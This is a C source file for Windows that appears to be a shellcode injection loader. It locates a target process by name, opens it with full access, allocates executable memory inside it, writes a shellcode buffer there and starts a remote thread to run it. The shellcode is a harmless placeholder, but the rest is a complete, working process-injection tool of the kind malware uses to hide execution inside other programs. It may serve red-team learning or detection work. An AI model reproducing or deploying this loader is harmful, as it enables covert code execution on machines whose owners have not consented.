#include<windows.h>
#include<stdio.h>
#include<tlhelp32.h>
#include<string.h>

const char* k = "[+]";
const char* i = "[*]";
const char* e = "[-]";

DWORD PID = 0, TID = 0;
LPVOID rBuffer = NULL;
HANDLE hProcess = NULL, hThread = NULL;

unsigned char shellcode[] = "\x41\x41\x41"; // Sample shellcode

/* Function to find process by name and return PID */
DWORD FindProcessByName(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("%s Failed to create snapshot. Error: %ld\n", e, GetLastError());
        return 0;
    }

    PROCESSENTRY32 pe32 = { 0 };
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        printf("%s Failed to get first process. Error: %ld\n", e, GetLastError());
        CloseHandle(hSnapshot);
        return 0;
    }

    do {
        if (_stricmp(pe32.szExeFile, processName) == 0) {
            printf("%s Found process '%s' with PID: %ld\n", k, processName, pe32.th32ProcessID);
            CloseHandle(hSnapshot);
            return pe32.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &pe32));

    printf("%s Process '%s' not found on the system\n", e, processName);
    CloseHandle(hSnapshot);
    return 0;
}

/* Function to list all running processes */
void ListAllProcesses() {
    printf("%s Available processes on the system:\n", i);
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("%s Failed to create snapshot\n", e);
        return;
    }

    PROCESSENTRY32 pe32 = { 0 };
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        printf("%s Failed to get first process\n", e);
        CloseHandle(hSnapshot);
        return;
    }

    int count = 0;
    do {
        printf("\t[%d] %s (PID: %ld)\n", ++count, pe32.szExeFile, pe32.th32ProcessID);
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
}

int main(int argc, char* argv[]) {
   
    if (argc < 2) {
        printf("%s Usage: %s <ProcessName>\n", e, argv[0]);
        printf("%s Example: %s notepad.exe\n\n", i, argv[0]);
        ListAllProcesses();
        return EXIT_FAILURE;
    }

    const char* targetProcess = argv[1];
    printf("%s Looking for process '%s'...\n", i, targetProcess);

    /* Find the target process */
    PID = FindProcessByName(targetProcess);
    
    if (PID == 0) {
        return EXIT_FAILURE;
    }

    printf("%s Trying to open a handle to process (%ld)\n", i, PID);

    /* open a handle to the process */
    hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        PID
    );

    printf("%s Handle to process:\n\\---0x%p\n", k, hProcess);

    if (hProcess == NULL) {
        printf("%s Failed to open a handle to process (%ld). Error: %ld\n", e, PID, GetLastError());
        return EXIT_FAILURE;
    }

    /* allocate memory within the remote process */
    rBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    printf("%s Allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n", k, sizeof(shellcode));
    
    /* write shellcode to allocated memory */
    if (!WriteProcessMemory(
        hProcess,
        rBuffer,
        shellcode,
        sizeof(shellcode),
        NULL
    )) {
        printf("%s Failed to write shellcode. Error: %ld\n", e, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    printf("%s Wrote %zu-bytes to process memory\n", k, sizeof(shellcode));

    /* create remote thread in the target process */
    hThread = CreateRemoteThreadEx(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)rBuffer, // starting point of the buffer
        NULL,
        0,
        0,
        &TID
    );

    if (hThread == NULL) {
        printf("%s Failed to create remote thread. Error: %ld\n", e, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    printf("%s Remote thread created. Thread ID: %ld\n", k, TID);
    
    /* wait for remote thread to finish execution */
    printf("%s Waiting for remote thread to finish execution\n", i);
    WaitForSingleObject(hThread, INFINITE);
    printf("%s Remote thread finished execution\n", i);

    /* clean up handles */
    printf("%s Cleaning up handles\n", i);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    printf("%s Done!\n", k);
    return EXIT_SUCCESS;
}
